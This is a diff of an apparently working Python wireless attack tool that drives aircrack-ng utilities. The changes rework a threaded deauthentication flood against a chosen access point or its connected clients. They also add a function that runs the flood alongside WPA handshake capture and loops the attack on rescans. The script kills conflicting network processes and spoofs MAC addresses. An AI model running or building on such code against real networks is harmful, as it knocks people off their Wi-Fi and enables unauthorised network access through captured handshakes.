@@ -12,12 +12,12 @@ from mods.colors import *
 
 def aireplay():
     print(color.GREEN+"[+] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
-    cmd = subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])
+    subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])
     
 
 def check_kill():
     print(color.GREEN+"[+] Killing conflicting processes..."+color.END)
-    cmd = subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()
+    subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()
 
 def NetworkManager():
     print(color.GREEN+"[+] Restarting conflicting processes..."+color.END)
@@ -102,27 +102,28 @@ def read_dump():
         NetworkManager()
         reset_mac()
         sys.exit()
-    try:
-        AP = AP_dict[AP_ch]
-    except:
-        print(color.RED+"\n[-] Invalid Value"+color.END)
-        NetworkManager()
-        reset_mac()
-        sys.exit()
+    else:
+        try:
+            AP = AP_dict[AP_ch]
+        except:
+            print(color.RED+"\n[-] Invalid Value"+color.END)
+            NetworkManager()
+            reset_mac()
+            sys.exit()
         
-    with open(nwst_file, 'r') as csvfile:
-        dump_file = csv.reader(csvfile)
-        for row in dump_file:
-            if len(row) < 1:
-                pass
-            elif row[0] == "BSSID":
-                pass
-            elif row[0] == "Station MAC":
-                break
-            elif row[0] == AP:
-                bssid = row[0].strip()
-                channel = row[3].strip()
-                essid = row[13].strip()
+        with open(nwst_file, 'r') as csvfile:
+            dump_file = csv.reader(csvfile)
+            for row in dump_file:
+                if len(row) < 1:
+                    pass
+                elif row[0] == "BSSID":
+                    pass
+                elif row[0] == "Station MAC":
+                    break
+                elif row[0] == AP:
+                    bssid = row[0].strip()
+                    channel = row[3].strip()
+                    essid = row[13].strip()
     
 
 def airmon():
@@ -211,7 +212,6 @@ def read_dump_s():
             try:
                 if row[5].strip() == bssid :
                     station_dict.update({s:row[0]})
-                    print("\t{:5s} {:30s}".format(str(s), row[0].strip()))
                     stations_table.add_row([str(s), row[0].strip()])
                     s+=1
             except:
@@ -261,26 +261,25 @@ def ddos():
     run = False
     found = False
     threads = []
-    if len(station_ch) > 0 :
+    for x in station_ch.split():
+        if x == '0':
+            found = True
+    if found == True:
+        run = True
+        aireplay()
+    else:
+        run = True
         for x in station_ch.split():
-            if x == '0':
-                found = True
-        if found == True:
-            run = True
-            aireplay()
-            ReDo()
-        else:
-            run = True
-            for x in station_ch.split():
-                print(color.GREEN+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
-            for x in station_ch.split():
-                t = threading.Thread(target=aireplay_s, args=(x,))
-                threads.append(t)
-            for i in threads:
-                i.start()
-            for i in threads:
-                i.join()
-            ReDo()
+            print(color.GREEN+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
+        for x in station_ch.split():
+            t = threading.Thread(target=aireplay_s, args=(x,))
+            threads.append(t)
+        for i in threads:
+            i.start()
+        for i in threads:
+            i.join()
+            
+        
         
 def ReDo():
     print(color.GREEN+"\n[+] Job Done"+color.END)
@@ -297,20 +296,33 @@ def ReDo():
         airodump()
         read_dump()
         read_dump_s()
+        attck_thread()
+        ReDo()
     elif redo_ch == "A":
         print(color.GREEN+"\n[+] Rescanning for Access Points"+color.END)
         airodump()
         read_dump()
         read_dump_s()
+        attck_thread()
+        ReDo()
     elif redo_ch == "R":
         print(color.GREEN+"\n[+] Rescanning for stations"+color.END)
         read_dump_s()
+        attck_thread()
+        ReDo()
     elif redo_ch == "e":
         print(color.RED+"\n[-] Exiting..."+color.END)
         NetworkManager()
         reset_mac()
         sys.exit()
-      
+    
+def attck_thread():
+    t1 = threading.Thread(target=ddos)
+    t2 = threading.Thread(target=handshake)
+    t1.start()
+    t2.start()
+    t1.join()
+    t2.join()
 
 
 
